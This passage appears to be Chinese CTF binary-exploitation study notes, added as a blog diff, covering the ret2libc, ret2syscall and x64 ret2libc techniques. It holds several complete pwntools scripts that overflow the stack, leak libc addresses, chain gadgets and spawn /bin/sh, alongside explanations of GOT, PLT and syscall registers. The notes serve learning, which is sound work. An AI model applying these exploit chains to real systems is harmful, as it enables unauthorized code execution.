+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172223075.png"  alt="image-20250711172223075"></p>
+<p>注意选取的基本原则：有几个参数就用几个pop指令，比如调用完gets函数之后，因为gets函数只有一个参数，所有可以将gets函数的返回地址改为0x0804862F，即只执行一个pop指令弹出参数之后就是ret指令；比如read函数有三个参数，那么就找0x0804862D这个位置，因为这个位置的指令是3个pop指令加上一个ret指令</p>
+<p>如何<strong>寻找若干个pop指令跟着ret指令</strong></p>
+<p><code>ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;</code></p>
+<p>(ROPgadget用于查找用来攻击的可执行代码片段，而readlf是程序的整体结构和内存布局)</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172236929.png"  alt="image-20250711172236929"></p>
+<h4 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x8048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">pop1_ret=0x804861b</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(pop1_ret)+p32(bss)</span><br><span class="line">payload+=p32(sys)+p32(pop1_ret)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>payload += p32(get) + p32(pop1_ret) + p32(bss)</code>:</p>
+<p><strong>盘子比喻</strong></p>
+<ol>
+<li><p><strong>准备 ROP 链（堆叠盘子）：</strong> 你在内存的栈上，从下往上（也就是从低地址往高地址，因为栈是向下增长的），像堆叠盘子一样放了一系列地址。 假设你的 ROP 链片段是：<code>A</code> (get地址), <code>B</code> (pop ebp; ret地址), <code>C</code> (bss地址)。</p>
+<p><strong>栈上的盘子：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... (其他数据)</span><br><span class="line">[ C 盘子 (bss地址) ]  &lt;-- 位于栈上较高位置</span><br><span class="line">[ B 盘子 (pop ebp; ret地址) ]</span><br><span class="line">[ A 盘子 (get地址) ]  &lt;-- 位于栈上较低位置，最先被程序“看到”</span><br></pre></td></tr></table></figure>
+
+<p>当程序返回时，会先“拿起”最上面的盘子（A）。</p>
+</li>
+<li><p><strong>执行 <code>get</code> 函数（使用 A 盘子）：</strong></p>
+<ul>
+<li>程序因为栈溢出被劫持，它会跳到 <code>get</code> 函数的地址（A 盘）。</li>
+<li><code>get</code> 函数开始执行。它需要一个参数，也就是一个内存地址来存放它读取的数据。</li>
+<li><code>get</code> 函数会去“看”它自己返回地址上方的“盘子”，也就是 <code>C 盘子 (bss地址)</code>。</li>
+<li><strong>所以，<code>C 盘子 (bss地址)</code> 被 <code>get</code> 函数当作了它的参数</strong>，<code>get</code> 会将你通过 <code>p.sendline(&quot;/bin/sh&quot;)</code> 发送的数据写入到 <code>C 盘子</code> 所指示的内存区域（即 <code>bss</code> 段）。</li>
+<li><code>get</code> 函数执行完毕后，它需要“返回”。它会从栈上取回它的返回地址，也就是紧邻其下的 <code>B 盘子 (pop ebp; ret地址)</code>。</li>
+</ul>
+</li>
+<li><p><strong>执行 <code>pop ebp; ret</code> gadget（使用 B 盘子）：</strong></p>
+<ul>
+<li>程序跳转到 <code>B 盘子 (pop ebp; ret地址)</code>。</li>
+<li>现在，<code>B 盘子</code> 内部的指令开始执行：<ul>
+<li><strong><code>pop ebp</code>：</strong> 这条指令会“拿起”栈顶的那个盘子。此时栈顶就是 <code>C 盘子 (bss地址)</code>。所以，<code>C 盘子 (bss地址)</code> 会被弹出并放入 <code>ebp</code> 寄存器。这个操作相当于把 <code>C 盘子</code> 从栈中拿走了。</li>
+<li><strong><code>ret</code>：</strong> 这条指令会“拿起”栈中现在最上面的盘子（也就是 <code>C 盘子</code> 被拿走后暴露出的下一个盘子），并跳转到那个盘子上的地址。这个盘子就是你 ROP 链中的下一个函数地址（例如 <code>sys</code> 函数的地址）。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="ret2syscall-底层系统调用静态"><a href="#ret2syscall-底层系统调用静态" class="headerlink" title="ret2syscall(底层系统调用静态)"></a>ret2syscall(底层系统调用静态)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172249291.png"  alt="image-20250711172249291"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713164900591.png"  alt="image-20250713164900591"></p>
+<p>开启了NX保护，但我们可以通过精心构造ROP链实现跳转，而不改变数据段的数值</p>
+<p>除此之外没有上面有效的东西了,整个二进制文件中都没有system函数</p>
+<p>所以自己为寄存器赋值以构造后门函数。且调用的int 0x80要放在最上面，调用时，从下往上开始执行，执行到调用指令时，该函数的参数必须准备好、</p>
+<p>根据命令找到&#x2F;bin&#x2F;sh字符段 和int 0x80的调用命令以及需要的pop|ret命令</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172303242.png"  alt="image-20250711172303242"></p>
+<h4 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2syscall&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x080488ED&quot;)</span><br><span class="line">binsh=0x080ea068</span><br><span class="line">int_0x80=0x0806ce55</span><br><span class="line">pop_eax_ret = 0x080b8526</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806f200</span><br><span class="line"></span><br><span class="line">eax = 11 # #define __NR_ execve 11</span><br><span class="line">ebx = binsh</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(pop_eax_ret)+p32(eax)</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="函数调用和系统调用"><a href="#函数调用和系统调用" class="headerlink" title="函数调用和系统调用"></a>函数调用和系统调用</h3><table>
+<thead>
+<tr>
+<th>特点</th>
+<th>函数调用</th>
+<th>系统调用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>面向</td>
+<td>普通程序</td>
+<td>内核</td>
+</tr>
+<tr>
+<td>入口</td>
+<td><code>call func</code></td>
+<td><code>syscall</code> 指令</td>
+</tr>
+<tr>
+<td>参数约定</td>
+<td>System V ABI (RDI, RSI, RDX, RCX, R8, R9, …)</td>
+<td>Linux syscall ABI (RDI, RSI, RDX, R10, R8, R9)</td>
+</tr>
+<tr>
+<td>调用对象</td>
+<td>用户态的函数（可能是 libc 封装）</td>
+<td>内核的服务（文件、进程、网络等）</td>
+</tr>
+<tr>
+<td>返回位置</td>
+<td>RAX</td>
+<td>RAX</td>
+</tr>
+<tr>
+<td>使用场景</td>
+<td>普通代码调用库函数</td>
+<td>手写 shellcode、ROP 直接调用内核服务</td>
+</tr>
+</tbody></table>
+<h4 id="编译知识"><a href="#编译知识" class="headerlink" title="编译知识"></a>编译知识</h4><p>（1）静态编译。编译器在编译可执行文件的时候，会提取可执行文件需要调用的对应的动态链接库（.so）中的部分，并链接到可执行文件中</p>
+<p>去，使可执行文件在运行的时候不依赖于动态链接库。</p>
+<p>（2）动态编译。动态编译的可执行文件需要附带一个动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以，其优点一方面是</p>
+<p>缩小了可执行文件的大小，<strong>优点</strong>加快了编译速度，节省了系统资源。<strong>缺点</strong>一方面是哪怕很简单的程序，只要用到了链接库中的一两条命令，也要附带一个庞大的链接库；另一方面是如果其他计算机上没有安装对应的运行库，则经过动态编译的可执行文件就不能运行。</p>
+<p>静态编译的优缺点与动态编译正好相反。</p>
+<p>静态编译可以简单理解为将动态链接库中的代码拷贝出来放入对应的二进制文件里。</p>
+<p><strong>寄存器</strong></p>
+<p>在32位系统中，通过<strong>int 0x80</strong>指令触发系统调用。其中，EAX寄存器用于传递系统调用号，参数按顺序赋值给<strong>EBX、ECX、EDX、ESI、</strong></p>
+<p><strong>EDI、EBP</strong>这6个寄存器。</p>
+<p>在64位系统中，使用<strong>syscall</strong>指令来触发系统调用，同样使用<strong>EAX（RAX）寄存器传递系统调用号</strong>，<strong>RDI、RSI、RDX、RCX、R8、R9</strong></p>
+<p>这6个寄存器用来传递参数。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172325495.png"  alt="image-20250711172325495"></p>
+<p>eg:<code>read（0,buf,0x100）</code></p>
+<p>32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。</p>
+<p>64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。</p>
+<p>也是进入内核态执行。</p>
+<p>如果想要完成<code>Get shell</code></p>
+<p>32位时，：eax&#x3D;11（#define__NR_execve 11）;ebx&#x3D;”&#x2F;bin&#x2F;sh”;ecx&#x3D;0;edx&#x3D;0;（NULL实际上就是0），设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的execve（”&#x2F;bin&#x2F;sh”,NULL,NULL）。</p>
+<p>64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0;</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172348689.png"  alt="image-20250711172348689"></p>
+<p>在ida中红色为外部函数，白色为内部函数</p>
+<p>静态编译的二进制文件全为内部函数</p>
+<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250725092324043.png"  alt="image-20250725092324043"></p>
+<h4 id="脚本-6"><a href="#脚本-6" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3&quot;)</span><br><span class="line">#gdb.attach(p, &quot;b *0x0804854C&quot;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">main_addr = 0x0804854E</span><br><span class="line"></span><br><span class="line"># 泄露 gets 地址</span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"># 获取泄露地址</span><br><span class="line">leak_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"># 用 LibcSearcher 查</span><br><span class="line">libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher 会根据你提供的函数名和地址，去匹配已知的 libc 数据库</span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)是gets 函数在 libc 中的偏移（相对于 libc 基地址）</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">log.success(&quot;system: &quot; + hex(system_addr))</span><br><span class="line">log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#输出这个计算出的地址，便于检查</span><br><span class="line"></span><br><span class="line"># 第二次攻击</span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)</code></p>
+<p>调用put函数泄露gets函数的实际地址，并且返回main函数，再次利用got漏洞</p>
+<p>它内部使用的是 <strong>预定义符号名</strong> ，比如：</p>
+<ul>
+<li><code>&quot;system&quot;</code></li>
+<li><code>&quot;gets&quot;</code></li>
+<li><code>&quot;printf&quot;</code></li>
+<li><code>&quot;str_bin_sh&quot;</code> （就是你要找的 <code>/bin/sh</code>）</li>
+</ul>
+<p>这些名字不是随便写的，是预先在 libc 数据库中定义好的符号名称。</p>
+<p>脚本执行后会显示</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250715113729689.png"  alt="image-20250715113729689"></p>
+<p>这是因为用libc &#x3D; LibcSearcher(“gets”, leak_addr)进行选择适合的libc库，但不同版本的libc.so文件的变化不大，一个函数的地址约束不够严格，所以会显示多个libc版本供选择</p>
+<h4 id="解决多个libc-so版本供选择"><a href="#解决多个libc-so版本供选择" class="headerlink" title="解决多个libc.so版本供选择"></a>解决多个libc.so版本供选择</h4><p>1.多个约束条件</p>
+<p><strong>哪些符号最稳妥</strong></p>
+<p>这是个很重要的问题：</p>
+<blockquote>
+<p>为什么泄露 gets &#x2F; puts &#x2F; printf，不泄露 malloc &#x2F; exit &#x2F; system 呢？</p>
+</blockquote>
+<p>理由：</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>稳妥程度</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>puts</strong></td>
+<td>👍</td>
+<td>几乎每个 libc 里都有，偏移独特</td>
+</tr>
+<tr>
+<td><strong>printf</strong></td>
+<td>👍</td>
+<td>常见，偏移独特</td>
+</tr>
+<tr>
+<td><strong>gets</strong></td>
+<td>👍（但是 glibc2.28+ 被废弃了）</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>read</strong></td>
+<td>👍</td>
+<td>核心 IO，存在且稳定</td>
+</tr>
+<tr>
+<td><strong>write</strong></td>
+<td>👍</td>
+<td>和 read 对应</td>
+</tr>
+<tr>
+<td><strong>system</strong></td>
+<td>👎</td>
+<td>很常用，但是有的 libc 把它静态链接了或者位置很常见</td>
+</tr>
+<tr>
+<td><strong>exit</strong></td>
+<td>👎</td>
+<td>偏移较小且常见，不建议用</td>
+</tr>
+<tr>
+<td><strong>__libc_start_main</strong></td>
+<td>👍</td>
+<td>非常稳妥，通常不会冲突</td>
+</tr>
+</tbody></table>
+<p>因此建议你泄露的优先级是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets</span><br></pre></td></tr></table></figure>
+
+<p>理想状态下，你一次性泄露三个符号，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">puts(gets@got);</span><br><span class="line">puts(puts@got);</span><br><span class="line">puts(printf@got);</span><br></pre></td></tr></table></figure>
+
+<p>然后用三个符号去查库，几乎100%唯一</p>
+<p>但是</p>
+<p>当程序编译时，只有真正被调用的外部库函数才会被链接，并且它们才会在 GOT 表里有条目。</p>
+<p>而你的目标程序 <code>./ret2libc3</code> 里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash复制编辑gets, puts 有用到</span><br><span class="line">printf 没用到</span><br></pre></td></tr></table></figure>
+
+<p>所以：只能有两个约束条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">css复制编辑elf.got[&quot;gets&quot;] ✅ 存在</span><br><span class="line">elf.got[&quot;puts&quot;] ✅ 存在</span><br><span class="line">elf.got[&quot;printf&quot;] ❌ 报错</span><br></pre></td></tr></table></figure>
+
+<p><strong>脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got = elf.got[&quot;puts&quot;]#puts的got表</span><br><span class="line">main_addr = 0x0804854E</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)</span><br><span class="line">payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#输出puts的实际位置</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_addr = u32(p.recv(4))</span><br><span class="line">leak_puts = u32(p.recv(4))#接收其位置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;gets&quot;, leak_addr)</span><br><span class="line">libc.add_condition(&quot;puts&quot;, leak_puts)#增加puts的位置作为约束条件</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;gets&quot;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">log.success(&quot;system: &quot; + hex(system_addr))</span><br><span class="line">log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;ret2libc3\n&quot;)</span><br><span class="line">payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;</span><br><span class="line">payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是这个我尝试过对这个题目来说还是约束条件太少，但是由于这个题目调用函数比较少，所以可以作为约束的函数也比较少</p>
+<p>1）GOT。GOT是全局偏移量表（Global Offset Table），用于存储外部函数在内存中的确切地址。GOT存储在数据段（Data Segment）内，可以在程序运行过程中被修改。</p>
+<p>2）PLT是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之，程序会到PLT中寻找外部函数的地址。PLT存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改。</p>
+<p><strong>简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限（在FULL RELRO保护机制开启的时候，没有读写权限）；PLT是外部函数的入口表，存储的是每个外部函数的代码，具有执行权限。</strong></p>
+<p><strong>尽管 <code>libc</code> 的加载地址是随机的（ASLR），但在libc不同的情况下 <code>libc</code> 内部所有函数相对于 <code>libc</code> 基地址的偏移量是固定不变的。这是 <code>ret2libc</code> 攻击的基础。</strong></p>
+<p><strong>实际地址&#x3D;基址+偏移</strong></p>
+<p>当你写了一个程序使用了 <code>libc</code> 中的函数（如 <code>printf</code>），这个函数的具体地址在编译时是未知的，因为 libc 被加载的位置会因 ASLR（地址空间布局随机化）而变化。</p>
+<table>
+<thead>
+<tr>
+<th>函数名称</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PLT</td>
+<td>提供跳转桩代码</td>
+</tr>
+<tr>
+<td>GOT</td>
+<td>存放实际函数地址</td>
+</tr>
+</tbody></table>
+<p>当你的程序调用 <code>printf()</code> 时，实际上调用的是 PLT 中的 <code>printf@plt</code>，PLT 再通过 GOT 查找真正的地址。</p>
+<h4 id="🔁-总结对比（重点来了！）"><a href="#🔁-总结对比（重点来了！）" class="headerlink" title="🔁 总结对比（重点来了！）"></a>🔁 总结对比（重点来了！）</h4><table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>为什么可以用 system@plt？</strong></td>
+<td>因为它是 libc 中<code>system()</code>函数的“入口大门”，进去以后就会自动跳过去，不用你自己去找路。</td>
+</tr>
+<tr>
+<td><strong>为什么不用 GOT？</strong></td>
+<td>因为我们不是要读取地址，而是要调用函数。PLT 就像按钮，按下去就能运行函数，不需要先看地址。</td>
+</tr>
+<tr>
+<td><strong>什么时候必须用 GOT？</strong></td>
+<td>当你在远程服务器上不知道 libc 版本和地址时，必须先通过 GOT 泄露一个函数地址，才能计算出其他函数的地址。</td>
+</tr>
+<tr>
+<td><strong>什么时候能直接用 PLT？</strong></td>
+<td>当你在本地调试、libc 是固定的，而且程序没开 PIE（地址不随机化）的时候，就可以直接调用 PLT。</td>
+</tr>
+</tbody></table>
+<p><code>ret2libc3</code> 可以用 <code>ret2syscall</code> 的方法来攻击，只需要找到特定的、固定的 ROP gadgets 和 <code>int 0x80</code> 指令。</p>
+<p>选择 <code>ret2libc</code> 的方法，通常是因为 <code>system()</code> 函数提供的便捷性更高，虽然多了一步 <code>libc</code> 泄露的开销，但在大多数情况下，这种方法更“简单”且更“通用”。</p>
+<p>在实际的 CTF 比赛中，攻击者会根据目标程序的具体情况（是否有易于利用的 <code>int 0x80</code>、是否有足够的 gadgets、是否有 <code>&quot;/bin/sh&quot;</code> 字符串等）来选择最简单、最可靠的攻击方法。</p>
+<p><code>ret2libc</code>3 之所以需要泄露 <code>libc</code> 地址，是因为它<strong>依赖于调用 <code>libc</code> 库中</strong>（而非程序自身）的<strong>封装函数</strong>（如 <code>system()</code>），而这些 <code>libc</code> 函数的地址会受到 <strong>ASLR (地址空间布局随机化)</strong> 的影响而随机化。<code>ret2syscall</code> 能够不泄露 <code>libc</code> 地址，是因为它<strong>依赖于程序自身或加载到固定地址的共享库中</strong>的 <strong>ROP gadget</strong> 和 <strong><code>int 0x80</code> 指令</strong>，这些地址在没有 PIE (位置无关可执行文件) 的情况下是固定的。</p>
+<h3 id="ret2libc3-x64"><a href="#ret2libc3-x64" class="headerlink" title="ret2libc3_x64"></a>ret2libc3_x64</h3><p>32位程序的payload都是在返回地址之后加上参数，而64位是在返回地址之前把参数放入寄存器中</p>
+<p>64位程序和32位程序的ROP技术的不同点在于<strong>参数传递</strong>的方式不同。64位程序的前6个参数是rdi,rsi,rdx,rcx,r8,r9，后续参数才会放在栈上，所以64位程序的ROP和ret2syscall几乎是一样的，都是先控制寄存器，再跳转到对应的函数进行操作。</p>
+<h4 id="脚本-7"><a href="#脚本-7" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3_x64&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3_x64&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">main_addr = elf.symbols[&quot;main&quot;]</span><br><span class="line"></span><br><span class="line">rdi = 0x0000000000400783 # pop rdi ; ret</span><br><span class="line">ret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignment</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;ret2libc3_x64\n&quot;)</span><br><span class="line"></span><br><span class="line">payload1 = b&quot;a&quot; * (0x108)</span><br><span class="line">payload1 += p64(rdi) + p64(gets_got)</span><br><span class="line">payload1 +=p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;gets&quot;, leak_addr)</span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;gets&quot;)</span><br><span class="line">#libc.address = libc_base#我感觉没什么用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base:&quot; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line"># ====== 修改开始：添加 GDB 动态下断点 ======</span><br><span class="line">gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;)  # 在 system 地址处下断点</span><br><span class="line"># ====== 修改结束 